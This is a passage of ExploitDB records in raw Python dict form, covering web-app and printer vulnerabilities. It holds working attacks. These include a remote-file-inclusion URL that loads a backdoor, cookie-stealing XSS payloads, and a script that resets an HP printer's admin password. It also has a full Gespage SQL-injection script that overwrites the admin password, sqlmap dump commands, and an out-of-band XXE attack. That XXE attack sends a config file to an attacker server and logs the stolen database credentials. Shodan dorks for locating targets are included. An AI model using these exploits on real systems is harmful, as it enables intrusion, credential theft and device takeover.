[2006-06-05]', u'description': u"dotWidget CMS 1.0.6 - 'file_path' Remote File Inclusion", u'platform': u'php', u'author': u'Aesthetico', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-06-05T00:00:00+00:00', u'_id': 1879, u'type': u'webapps', u'port': 0}

CVE: []
Description: JASmine 0.0.2 - 'index.php' Remote File Inclusion
{u'code': u'#\r\n# Title..: 7 php scripts File Inclusion Vuln / Source disclosure\r\n# Credits: DarkFig\r\n# Og.link: http://acid-root.new.fr/poc/13061007.txt\r\n#\r\n# Using http://www.google.com/codesearch\r\n# Few examples about what we can do with a code search engine\r\n# For educational purpose only.\r\n#\r\n# You can use regex in your research, this can be chaotic.\r\n# What\'s your opinion about the google code search project ?\r\n#\r\n\r\n# Affected.scr: Jasmine-Web\r\n# Download....: http://www.sourcefiles.org/Utilities/Printer/Jasmine-Web-0.0.2.tar.bz2\r\n# Poc.........: http://victim.pl/index.php?section=ftp://hack.com/backdrphpext\r\n# Vuln.code...: if (isset($_GET[\'section\']) && file_exists($_GET[\'section\'].".php")){\r\n#               include_once($_GET[\'section\'].".php");\r\n\r\n# milw0rm.com [2006-10-10]', u'description': u"JASmine 0.0.2 - 'index.php' Remote File Inclusion", u'platform': u'php', u'author': u'DarkFig', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-10-10T00:00:00+00:00', u'_id': 2505, u'type': u'webapps', u'port': 0}

CVE: []
Description: TP-Link TL-PS110U / TL-PS110P - Cross-Site Scripting
{u'code': u'GotGeek Labs\r\nhttp://www.gotgeek.com.br/\r\n\r\nTP-Link TL-PS110U & TL-PS110P Cross-site Scripting Vulnerability\r\n\r\n\r\n\r\n[+] Description\r\n\r\nTL-PS110U:\r\nThe TP-LINK TL-PS110U print server allows you to take the computer out\r\nof the loop while setting up a printing network. All that is needed is to\r\nconnect the TL-PS110U to a printer via the USB port, connect the print\r\nserver to your LAN, and you will be able to access your printer from any\r\ncomputer on the LAN.\r\n\r\nTL-PS110P:\r\nThe TP-LINK TL-PS110P print server allows you to take the computer out\r\nof the loop while setting up a printing network. All that is needed is to\r\nconnect the TL-PS110P to a printer via the parallel port, connect the print\r\nserver to your LAN, and you will be able to access your printer from any\r\ncomputer on the LAN.\r\n\r\n\r\n\r\n[+] Information\r\n\r\nTitle: TP-Link TL-PS110U & TL-PS110P Cross-site Scripting Vulnerability\r\nShodan Dork: ZOT-PS-47/9.8.0016 -WWW-Authenticate\r\n             ZOT-PS-30/8.3.0013 -WWW-Authenticate\r\nAdvisory: gg-006-2011\r\nDate: 03-15-2011\r\nLast update: 03-26-2011\r\nLink: http://www.gotgeek.com.br/pocs/gg-006-2011.txt\r\n\r\n\r\n\r\n[+] Vulnerabilities\r\n\r\nStored Cross-site Scripting:\r\nWeb interface from TL-PS110U and TL-PS110P Print Servers are affected by stored\r\ncross-site scripting vulnerability because it fails to properly sanitize\r\nuser-supplied input at "NDSContext" field in "NetWare NDS Settings" area.\r\nAn attacker may leverage this issue to execute arbitrary script code\r\nin the browser of an unsuspecting user in the context of the affected site.\r\n\r\nAfter injecting the XSS code, you need to access Netware status page.\r\n\r\n\r\nAffected Versions:\r\n\r\nTP-Link TL-PS110U Network Print Server\r\nFirmware: 9.08.47T 0016 (ZOT-PS-47/9.8.0016)\r\n          9.08.47T 0013 (ZOT-PS-47/9.8.0013)\r\n          6.03.35T 0007 (ZOT-PS-47/9.8.0007)\r\n          6.03.35T 0006 (ZOT-PS-47/9.8.0006)\r\n          6.03.35T 0005 (ZOT-PS-47/9.8.0005)\r\n          6.03.35T 0004 (ZOT-PS-47/9.8.0004)\r\n\r\nTP-Link TL-PS110P Network Print Server\r\nFirmware: 8.03.30T 0013 (ZOT-PS-30/8.3.0013)\r\n          8.03.30T 0009 (ZOT-PS-30/8.3.0009)\r\n          8.03.30T 0008 (ZOT-PS-30/8.3.0008)\r\n\r\nOther versions may also be vulnerable.\r\n\r\n\r\n\r\n[+] Proof of Concept/Exploit\r\n\r\nXSS:\r\nhttp://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>\r\n\r\nand then..\r\n\r\nhttp://target/NETWARE.HTM\r\n\r\n\r\n\r\n[+] Timeline\r\n\r\n24-03-2011: first contact to vendor.\r\n27-03-2011: support contact response, asking more details.\r\n27-03-2011: more information sent.\r\n03-04-2011: no vendor response.\r\n04-04-2011: advisory published.\r\n\r\n\r\n\r\n[+] References\r\n\r\nhttp://www.tp-link.com/products/productDetails.asp?class=&pmodel=TL-PS110U\r\nhttp://www.tp-link.com/products/productDetails.asp?class=&pmodel=TL-PS110P\r\n\r\n\r\n\r\n[+] Credits\r\n\r\nb0telh0', u'description': u'TP-Link TL-PS110U / TL-PS110P - Cross-Site Scripting', u'platform': u'hardware', u'author': u'b0telh0', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-04-04T00:00:00+00:00', u'_id': 17113, u'type': u'webapps', u'port': 0}

CVE: []
Description: Invision Power Board (IP.Board) 2.0.4 - Print Action 't' Cross-Site Scripting
{u'code': u"source: http://www.securityfocus.com/bid/17144/info\r\n   \r\nInvision Power Board is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. \r\n   \r\nAn attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.\r\n\r\nhttp://www.example.com/forum/index.php?act=Print&client=printer&f=1&t='><script>alert(document.cookie)</script>", u'description': u"Invision Power Board (IP.Board) 2.0.4 - Print Action 't' Cross-Site Scripting", u'platform': u'php', u'author': u'Mr.SNAKE', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-03-17T00:00:00+00:00', u'_id': 27439, u'type': u'webapps', u'port': 0}

CVE: []
Description: HP LaserJet Pro P1606dn - Webadmin Password Reset
{u'code': u"#!/usr/bin/python\r\n# Exploit Title: HP LaserJet Pro P1606dn Webadmin password reset\r\n# Date: 20.05.2013\r\n# Exploit Author: m3tamantra (http://m3tamantra.wordpress.com/blog)\r\n# Vendor Homepage: http://www8.hp.com/de/de/products/printers/product-detail.html?oid=4110411 \r\n# Firmware Date: 20100223\r\n\r\nimport urllib2\r\n\r\nip = '192.168.1.2' # Printer IP\r\n\r\nreq = urllib2.Request('http://'+ip+'/cgi-bin/ip_password_result.htm', data='ID_p+184=&ID_p+184=&Apply=%C3%9Cbernehmen')\r\nreq.add_header('Referer', 'http://'+ip+'/SSI/Auth/ip_password.htm')\r\nreq.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1')\r\n\r\nf = urllib2.urlopen(req)\r\nif f.getcode() == 200:\r\n    print 'Password reset successfully\\nHave a nice day ;-)'\r\nelse:\r\n    print 'Exploit fail :'+f.getcode()", u'description': u'HP LaserJet Pro P1606dn - Webadmin Password Reset', u'platform': u'hardware', u'author': u'm3tamantra', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-05-26T00:00:00+00:00', u'_id': 25715, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2017-7997']
Description: Gespage 7.4.8 - SQL Injection
{u'code': u'# [CVE-2017-7997] Gespage SQL Injection vulnerability\r\n\r\n## Description\r\n\r\nGespage is a web solution providing a printer portal. Official Website:\r\nhttp://www.gespage.com/\r\n\r\nThe web application does not properly filter several parameters sent by\r\nusers, allowing authenticated SQL code injection (Stacked Queries -\r\ncomment).\r\n\r\nThese vulnerabilities could allow attackers to retrieve / update data\r\nfrom the database through the application.\r\n\r\n**CVE ID**: CVE-2017-7997\r\n\r\n**Access Vector**: remote\r\n\r\n**Security Risk**: high\r\n\r\n**Vulnerability**: CWE-89\r\n\r\n**CVSS Base Score**: 8.6\r\n\r\n**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\r\n\r\n\r\n### Proof of Concept (dumping database data)\r\n\r\nThe parameters of these following pages are vulnerable:\r\n\r\n* Page: http://URL/ges/webapp/users/prnow.jsp\r\n  Parameter: show_prn\r\n  HTTP Method: Post\r\n\r\n* Page: http://URL/ges/webapp/users/blhistory.jsp\r\n  Parameter: show_month\r\n  HTTP Method: Post\r\n\r\n* Page: http://URL/ges/webapp/users/prhistory.jsp\r\n  Parameter: show_month\r\n  HTTP Method: Post\r\n\r\nWe can then detect the SQL Injection by requesting the server with the\r\ncurl tool, including a simple payload executing a sleep of different\r\nseconds:\r\n\r\n* Normal request:\r\n\r\n```\r\ncurl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d "show_prn=1"\r\nhttps://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w\r\n"\\nResponse Time:%{time_total}\\n"\r\n\r\nCurl output: Response Time:0,122\r\n```\r\n\r\n* Sleep Injection of 3 seconds into the request:\r\n\r\n```\r\ncurl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d\r\n"show_prn=1\');SELECT PG_SLEEP(3)--"\r\nhttps://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w\r\n"\\nResponse Time:%{time_total}\\n"\r\n\r\nCurl output: Response Time: 3,126\r\n```\r\n\r\n* Sleep Injection of 6 seconds into the request:\r\n\r\n```\r\ncurl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d\r\n"show_prn=1\');SELECT PG_SLEEP(6)--"\r\nhttps://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w\r\n"\\nResponse Time:%{time_total}\\n"\r\n\r\nCurl output: Response Time: 6,126\r\n```\r\n\r\nWe created a dedicated python script to change the web admin password in\r\norder to compromise the web application:\r\n\r\n```\r\n#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n\r\n"""\r\n$ python update_gespage_pwd.py -c e06d40bc855c98751a5a2ff49daa -i\r\nhttp://192.168.160.128:7180/gespage -p 12345\r\n[+] Generating the new admin password hash\r\n    => Password hash (sha1) to inject in the Database:\r\n8cb2237d0679ca88db6464eac60da96345513964\r\n[+] Verifying connection to the web interface:\r\nhttp://192.168.160.128:7180/gespage/\r\n    => Connection OK\r\n[+] Exploiting the SQL injection\r\n    => Vulnerable page:\r\nhttp://192.168.160.128:7180/gespage/webapp/users/prnow.jsp\r\n    => Posting Data   : show_prn=A-PRINTER-ON-THE-WEB-LIST\');UPDATE\r\nparam_gespage SET param_value=\'8cb2237d0679ca88db6464eac60da96345513964\'\r\nWHERE param_id=\'admin_pwd\'--\r\n[+] Go to the web admin interface, http://192.168.160.128:7180/admin/\r\nand log on with admin:12345\r\n"""\r\n\r\nfrom argparse import ArgumentParser\r\nfrom hashlib import sha1\r\nfrom requests import Session\r\nfrom urllib3 import disable_warnings\r\n\r\n\r\ndef exploit(args):\r\n    if args.ip_url[-1] != "/":\r\n        args.ip_url += "/"\r\n    print "[+] Generating the new admin password hash"\r\n    new_admin_pwd_hash = sha1(args.password).hexdigest()\r\n    print "    => Password hash (sha1) to inject in the Database: %s" %\r\n(new_admin_pwd_hash)\r\n    print "[+] Verifying connection to the web interface: %s" %\r\n(args.ip_url)\r\n    web_session = web_connection(args.ip_url, args.cookie)\r\n    print "[+] Exploiting the SQL injection"\r\n    sql_injection(args.ip_url, web_session, args.cookie, new_admin_pwd_hash)\r\n    print "[+] Go to the web admin interface, %s and log on with\r\nadmin:%s" % (args.ip_url.replace(\'gespage\', \'admin\'), args.password)\r\n\r\n\r\ndef sql_injection(url, session, user_cookie, new_admin_pwd_hash):\r\n    vulnerable_url = url + "webapp/users/prnow.jsp"\r\n    sql_update_query = "UPDATE param_gespage SET param_value=\'%s\' WHERE\r\nparam_id=\'admin_pwd\'" % (new_admin_pwd_hash)\r\n    sql_injection_payload = "A-PRINTER-ON-THE-WEB-LIST\');%s--" %\r\n(sql_update_query)\r\n    print "    => Vulnerable page: %s" % (vulnerable_url)\r\n    print "    => Posting Data   : show_prn=%s" %(sql_injection_payload)\r\n    response = session.post(vulnerable_url,\r\ncookies={"JSESSIONID":user_cookie}, verify=False, allow_redirects=True,\r\ndata={"show_prn":sql_injection_payload})\r\n    if not response.status_code == 200:\r\n        print "   There is an error while posting the payload, try with\r\nsqlmap.py"\r\n        exit(2)\r\n\r\n\r\ndef web_connection(url, user_cookie):\r\n    disable_warnings()\r\n    session = Session()\r\n    response = session.get(url, verify=False, allow_redirects=False,\r\ncookies={"JSESSIONID":user_cookie})\r\n    if (response.status_code == 302 and "webapp/user_main.xhtml" in\r\nresponse.text):\r\n        print "    => Connection OK"\r\n        return session\r\n    else:\r\n        print "    /!\\ Error while connecting the web interface with the\r\nspecified JSESSIONID cookie"\r\n        print "        => Make sure given application URL and JSESSIONID\r\ncookie are correct "\r\n        exit(1)\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    parser = ArgumentParser(description=\'Exploit Gespage SQL injection\r\nby updating the admin password. You must create then specify an existing\r\nuser in order to exploit the vulnerability\')\r\n    parser.add_argument(\'-i\',\'--ip_url\', help=\'The web interface URL,\r\nex: http://IP_ADDRESS:7181/gespage/\',required=True)\r\n    parser.add_argument(\'-c\',\'--cookie\', help=\'JSESSIONID cookie of an\r\nauthenticated user\',required=True)\r\n    parser.add_argument(\'-p\',\'--password\', help=\'New admin\r\npassword\',required=True)\r\n    exploit(parser.parse_args())\r\n\r\n```\r\n\r\nUsing [sqlmap](https://github.com/sqlmapproject/sqlmap), it is also\r\npossible to dump the content of the database, write other data, etc.\r\n\r\nDumping the admin password hash (if changed from the initial 123456\r\npassword):\r\n\r\n```\r\npython sqlmap.py -u "https://URL:7181/gespage/users/prnow.jsp"\r\n--cookie="JSESSIONID=YOUR_COOKIE_HERE"\r\n--data="show_prn=A-PRINTER-ON-THE-WEB-LIST" --dbms=PostgreSQL --risk 3\r\n--level 5 --technique TS -D public -T param_gespage -C param_value\r\n--time-sec 2 --dump --flush-session\r\n```\r\n\r\nDumping the users table:\r\n\r\n```\r\nsqlmap.py -u "https://URL:7181/gespage/users/prnow.jsp"\r\n--cookie="JSESSIONID=YOU_COOKIE_HERE"\r\n--data="show_prn=A-PRINTER-ON-THE-WEB-LIST" --dbms=PostgreSQL --risk 3\r\n--level 5 --technique TS -D public -T users --time-sec 2 --dump\r\n```\r\n\r\n\r\n## Timeline (dd/mm/yyyy)\r\n\r\n* 06/03/2017 : Initial discovery\r\n* 13/03/2017 : First contact attempt (Web form)\r\n* 21/04/2017 : Second contact attempt (public e-mail address)\r\n* 23/06/2017 : Phone call and successful e-mail contact\r\n* 23/06/2017 : Technical details sent to the editor\r\n* 20/07/2017 : No reply, follow-up e-mail\r\n* 27/07/2017 : Reply: fix planned for major release 7.5.0 in late September\r\n* 17/09/2017 : Informing the editor that we would publish in October\r\n* 3/10/2017 : Feedback from Gespage informing us that the issue has been\r\nfixed with version 7.4.9.\r\n* 02/01/2018 : Release of the advisory\r\n\r\n## Fixes\r\n\r\nUpgrade to Gespage 7.4.9\r\n\r\n## Affected versions\r\n\r\n* Versions up to 7.4.8\r\n\r\n## Credits\r\n\r\n* Mickael KARATEKIN <m.karatekin@sysdream.com>\r\n\r\n\r\n-- SYSDREAM Labs <labs@sysdream.com> GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1 * Website: https://sysdream.com/ * Twitter: @sysdream', u'description': u'Gespage 7.4.8 - SQL Injection', u'platform': u'jsp', u'author': u'Sysdream', u'cve': [u'CVE-2017-7997'], u'source': u'ExploitDB', u'date': u'2018-01-05T00:00:00+00:00', u'_id': 43447, u'type': u'webapps', u'port': 0}

CVE: []
Description: Longshine Multiple Print Servers - Cross-Site Scripting
{u'code': u'GotGeek Labs\r\nhttp://www.gotgeek.com.br/\r\n\r\nLongshine Multiple Print Servers Cross-site Scripting Vulnerability\r\n\r\n\r\n\r\n[+] Description\r\n\r\nLCS-PS110:\r\nThe LCS-PS110 Parallel-Port-Printserver enables you to share your printer\r\nin the whole network from every workstation. This multiprotocol printserver\r\nsupports the most common network protocols and operating systems. For\r\neasy configuration and administration it supports SNMP, Web-Interface and\r\nother configuration and management tools.\r\n\r\nLCS-PS101-A:\r\nThe LCS-PS101-A is a small, handy Printserver for Printers with USB-Connector.\r\nThe Printserver is the comfortable solution to connect Ink, Colour, Laser\r\nor Pinprinter to your Network with 10 or 100Mbit/s. The Printer will be\r\nconnected over a high-speed USB 2.0 standard port. It supports the most common\r\nOperating Systems. You can configure and administrate the Printserver with\r\nseveral Software and Web-Interfaces. The Printserver is the ideal device for\r\nflexible operations in envirements like Home-Offices or small and middle\r\nsized Offices.\r\n\r\nLCS-PS112:\r\nThe LCS-PS112 Printserver connects your Printers directly to the Network\r\nand gives every workstation in the network access for printing. The LCS\u2013PS112\r\nprovides 2 x USB printerports and 1x Parallel printerport enablinge three\r\nPrinters to share the whole Network. Easy and fast to configure with the\r\nPS-Admin-Tool. The LCS-PS112 is the right solution for small offices but also\r\na Enterprise solution for Printerfarms.\r\n\r\n\r\n\r\n[+] Information\r\n\r\nTitle: Longshine Multiple Print Servers Cross-site Scripting Vulnerability\r\nShodan Dork: ZOT-PS-47/9.8.0015 -WWW-Authenticate\r\n             ZOT-PS-35/6.2.0001 -WWW-Authenticate\r\n             ZOT-PS-39/6.3.0007 -WWW-Authenticate\r\nAdvisory: gg-010-2011\r\nDate: 03-15-2011\r\nLast update: 03-26-2011\r\nLink: http://www.gotgeek.com.br/pocs/gg-010-2011.txt\r\n\r\n\r\n\r\n[+] Vulnerabilities\r\n\r\nStored Cross-site Scripting:\r\nWeb interface from PS110, PS101-A and PS112 Print Servers are affected by stored\r\ncross-site scripting vulnerability because it fails to properly sanitize\r\nuser-supplied input at "NDSContext" field in "NetWare NDS Settings" area.\r\nAn attacker may leverage this issue to execute arbitrary script code\r\nin the browser of an unsuspecting user in the context of the affected site.\r\n\r\nAfter injecting the XSS code, you need to access Netware status page.\r\n\r\n\r\nAffected Versions:\r\n\r\nLongshine LCS-PS110 Parallel-Port-Printserver\r\nFirmware: 9.08.47L 0015 (ZOT-PS-47/9.8.0015)\r\n          8.02.30L (ZOT-PS-30/8.2.0004)\r\n\r\nLongshine LCS-PS101-A USB-Printserver\r\nFirmware: 9.08.47L 0015 (ZOT-PS-47/9.8.0015)\r\n          6.02.35L (ZOT-PS-35/6.2.0001)\r\n\r\nLongshine LCS-PS112 Printserver\r\nFirmware: 6.03.39L 0007 (ZOT-PS-39/6.3.0007)\r\n          6.03.39L 0004 (ZOT-PS-39/6.3.0004)\r\n\r\nOther versions may also be vulnerable.\r\n\r\n\r\n\r\n[+] Proof of Concept/Exploit\r\n\r\nXSS:\r\nhttp://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>\r\n\r\nand then..\r\n\r\nhttp://target/NETWARE.HTM\r\n\r\n\r\n\r\n[+] Timeline\r\n\r\n24-03-2011: first contact to vendor.\r\n29-03-2011: second contact to vendor.\r\n03-04-2011: no vendor response.\r\n04-04-2011: advisory published.\r\n\r\n\r\n\r\n[+] References\r\n\r\nhttp://www.longshine.de/longshine/products/printserver/PS110/PS110_eng.pdf\r\nhttp://www.longshine.de/longshine/products/printserver/PS101-A/PS101-A_eng.pdf\r\nhttp://www.longshine.de/longshine/products/printserver/PS112/PS112_eng.pdf\r\n\r\n\r\n\r\n[+] Credits\r\n\r\nb0telh0', u'description': u'Longshine Multiple Print Servers - Cross-Site Scripting', u'platform': u'hardware', u'author': u'b0telh0', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-04-04T00:00:00+00:00', u'_id': 17116, u'type': u'webapps', u'port': 0}

CVE: []
Description: KYOCERA Multi-Set Template Editor 3.4 - Out-Of-Band XML External Entity Injection
{u'code': u'#Vendor: KYOCERA Corporation\r\n#Product https://global.kyocera.com\r\n#Affected version: 3.4.0906\r\n#\r\n#Summary: KYOCERA Net Admin is Kyocera\'s unified\r\n#device management software that uses a web-based\r\n#platform to give network administrators easy and\r\n#uncomplicated control to handle a fleet for up to\r\n#10,000 devices. Tasks that used to require multiple\r\n#programs or walking to each printer can now be\r\n#accomplished in a single, fast and modern environment.\r\n#\r\n#Desc: KYOCERA Multi-Set Template Editor (part of Net\r\n#Admin) suffers from an unauthenticated XML External Entity\r\n#(XXE) injection vulnerability using the DTD parameter\r\n#entities technique resulting in disclosure and retrieval\r\n#of arbitrary data from the affected node via out-of-band\r\n#(OOB) channel attack. The vulnerability is triggered when\r\n#input passed to the Multi-Set Template Editor (kmmted.exe)\r\n#called by the ActiveX DLL MultisetTemplateEditorActiveXComponent.dll\r\n#is not sanitized while parsing a 5.x Multi-Set template XML\r\n#file.\r\n#\r\n#Tested on: Microsoft Windows 7 Professional SP1 (EN)\r\n# Apache Tomcat/8.5.15\r\n#\r\n#\r\n#Vulnerability discovered by Gjoko \'LiquidWorm\' Krstic @zeroscience\r\n#                            \r\n#\r\n#\r\n#Advisory ID: ZSL-2018-5459\r\n#Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5459.php\r\n#\r\n#\r\n#28.03.2018\r\n#\r\n#\u2014\r\n#\r\n#\r\n#Malicious.xml:\r\n\r\n<?xml version="1.0" encoding="UTF-8" ?>\r\n<!DOCTYPE ZSL [\r\n<!ENTITY % remote SYSTEM "http://192.168.1.71:7777/xxe.xml">\r\n%remote;\r\n%root;\r\n%oob;]>\r\n\r\n\r\nAttacker\'s xxe.xml:\r\n\r\n<!ENTITY % fetch SYSTEM "file:///C:\\Program Files\\Kyocera\\NetAdmin\\Admin\\conf\\db.properties">\r\n<!ENTITY % root "<!ENTITY &#37; oob SYSTEM \'http://192.168.1.71:7777/?%fetch;\'> ">\r\n\r\n\r\nData retrieval:\r\n\r\nlqwrm@metalgear:~$ python -m SimpleHTTPServer 7777\r\nServing HTTP on 0.0.0.0 port 7777 ...\r\n192.168.1.71 - - [01/Apr/2018 14:36:15] "GET /xxe.xml HTTP/1.1" 200 -\r\n192.168.1.71 - - [01/Apr/2018 14:36:15] "GET /?db_host=localhost%0D%0Adb_port=5432%0D%0Adb_name=KNETADMINDB%0D%0Adb_driver=pgsql%0D%0Adb_user=postgres%0D%0Adb_password=ENC(4YMilUUDS80QB5rD+Rhn1z89rNXQXxcw)%0D%0Adb_driverClassName=org.postgresql.Driver%0D%0Adb_url=jdbc:postgresql://localhost/KNETADMINDB%0D%0Adb_initialSize=1%0D%0Adb_maxActive=20%0D%0Adb_dialect=org.hibernate.dialect.PostgreSQLDialect HTTP/1.1" 200 -', u'description': u'KYOCERA Multi-Set Template Editor 3.4 - Out-Of-Band XML External Entity Injection', u'platform': u'xml', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-04-09T00:00:00+00:00', u'_id': 44430, u'type': u'webapps', u'port': 0}

CVE: []
Description: Real Estate - SQL Injection
{u'code': u'Description\r\n\r\nLinux And window Version available:\r\nThis software is available in both windows and linux version. It runs on asp\r\nand php extension.\r\n\r\nListings:\r\nWe can add unlimited property listing, with the property photo. System\r\nautomatically creates three thumbnail photo of the property. Which are\r\ndisplay in listing search result display, view details page and view full\r\nimage size page. ( click here for Thumbnail )\r\n\r\nListing Options:\r\nOnce viewing a property the visitor can contact the Listing poster and also\r\nsend a "Tell a Friend" note to his friends. Visitor can easily go to the\r\nprint page where they can easily print the printer friendly page.\r\n( click here for Thumbnail )\r\n\r\nSearch Facility:\r\nOur system search is very simple search. Visitor can give the min. and max\r\nprice , address e.t.c and search the listing.\r\n( click here for Thumbnail )\r\n\r\nFeatured Properties:\r\nFour Newly added listing will be displayed in the featured properties list.\r\nYou can copy and paste this code any where in your page to display the\r\nresult. The sample of the code is added in the user home page.\r\n( click here for Thumbnail )<\r\n\r\nNewsletter Signup:\r\nVisitors can sign up to the newsletter by just filling up their names and\r\nemail address. System will only add new emails if notifies the visitors if\r\ntheir email is already in system database.\r\n( click here for Thumbnail )\r\n\r\nListing Control:\r\nAdmin and agents can login to the system and mange the listing. Admin can\r\nedit/ delete all the listing while agents can only modify their own links.\r\n\r\nNewsletter Manager:\r\nAdmin panel has full featured mailing list newsletter manager. Admin can\r\ncreate unlimited mailing list and add unlimited email address to each\r\nmailing list. System can send email in both HTML and plain format. Admin can\r\nview preview of emails before sending them.\r\n( click here for Thumbnail )\r\n\r\nEmail settings:\r\nAdmin can easily set the email like forget password email, subscription and\r\nun subscription email, photo approved email , photo upload alert email and\r\nmany more. ( click here for Thumbnail )\r\n\r\nEasy Setup:\r\nSetting up this software is very easy. Just unzip the files and upload it to\r\nyour server. then just set one file and you are ready to go.\r\n\r\n~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~\r\n\r\nVulnerability:\r\n\r\n*SQLi Vulnerability\r\n\r\nDEMO URL :\r\n\r\nhttp://[site]/realestate/list.asp?agent=[sqli]\r\n\r\nhttp://[site]/realestate/viewphoto.asp?id=[sqli]\r\n\r\n\r\n# 0day n0 m0re #\r\n# L0rd CrusAd3r #\r\n\r\n\r\n-- \r\nWith R3gards,\r\nL0rd CrusAd3r', u'description': u'Real Estate - SQL Injection', u'platform': u'php', u'author': u'L0rd CrusAd3r', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-06-16T00:00:00+00:00', u'_id': 13897, u'type': u'webapps', u'port': 0}

CVE: []
Description: Brother HL Series Printers 1.15 - Cross-Site Scripting
{u'code': u'# Exploit Title: [ XSS at Brother HL series printers]\r\n\r\n \r\n# Date: [30.05.2018]\r\n \r\n# Exploit Author: [Huy Kha]\r\n\r\n# Vendor Homepage: [http://support.brother.com]\r\n \r\n# Software Link: [ Website ]\r\n \r\n# Version: Brother HL series printers.\r\n\r\n# Tested on: Mozilla FireFox \r\n \r\n# Reflected XSS Payload :\r\n\r\n"--!><Svg/OnLoad=(confirm)(1)>"\r\n\r\n# Description : Starting searching for printers without having a password. \r\nWhen you see a yellow bar with \'\'Configure the password\'\' you can take over the full printer by putting a password on it.\r\n\r\n\r\n# PoC :\r\nIf you want to execute the XSS you need to be loged into the web interface first. \r\n\r\n# Example :\r\n\r\n1. Go to the following url: http://127.0.0.1/\r\n2. Login with \'\'admin\'\' as password\r\n3. Intercept now the request with Burpsuite\r\n4. The XSS exist in the loginerror.html?url= parameter\r\n\r\n4. Demo URL: http://127.0.0.1/etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241\r\n\r\n\r\n# Request :\r\n\r\nGET /etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241 HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: nl,en-US;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n\r\n\r\n# Response :\r\n\r\nHTTP/1.1 200 OK\r\nCache-Control: no-cache\r\nContent-Length: 3389\r\nContent-Type: text/html\r\nContent-Language: nl\r\nConnection: close\r\nServer: debut/1.20\r\nPragma: no-cache\r\n\r\n<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html lang="nl" xmlns="http://www.w3.org/1999/xhtml" xml:lang="nl"><head><meta http-equiv="Content-Script-Type" content="text/javascript" /><meta http-equiv="content-style-type" content="text/css" /><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><script type="text/javascript" src="/common/js/ews.js"></script>\r\n <link rel="stylesheet" type="text/css" href="../common/css/common.css" /> \r\n <link rel="stylesheet" type="text/css" href="../common/css/ews.css" /><title>Brother HL-L2340D series</title></head><body><div id="baseFrame"><div id="frameContainer"><div id="headerFrameContainerLeft"><div id="headerFrameContainerRight"><div id="headerFrameInner"><div id="headerFrame"><div id="modelName"><h1>HL-L2340D series</h1><div class="SetBox" id="SetBoxAuthRight"><div id="SetBoxAuthLeft"><form method="post" action="/general/status.html"><div>Log&#32;in<input type="password" id="LogBox" name="B1d6" /><input type="hidden" name="loginurl" value="/net/net/service_detail.html?service="--!><Svg/OnLoad=(confirm)(1)>"&pageid=241"/><input id="login" type="submit" value="&nbsp;" /></div></form></div></div></div><div id="corporateLogo"><img src="/common/images/logo.gif" alt="Brother" /></div></div><div id="solutions"><div><span><a href="http://solutions.brother.com/cgi-bin/solutions.cgi?MDL=prn088&LNG=en&SRC=DEVICE">Brother<br />Solutions&#32;Center</a></span></div></div><div id="tabMenu"><ul><li><ul><li class="selected"><p>Algemeen</p></li></ul></li></ul></div></div></div></div><div id="mainFrameContainer"><div id="mainFrameTopLeft"><div id="mainFrameTopRight"><div id="mainFrameTopInner"><div id="subTabMenu">&nbsp;</div></div></div></div><div id="mainFrameInner"><div id="subMenu"><div><a href="/general/status.html">Status</a></div><div><a href="/general/reflesh.html" class="subPage">Interval&#32;voor&#32;autom.&#32;vernieuwen</a></div><div><a href="/general/information.html?kind=item">Onderhoudsinformatie</a></div><div><a href="/general/lists.html">Lijsten/Rapporten</a></div><div><a 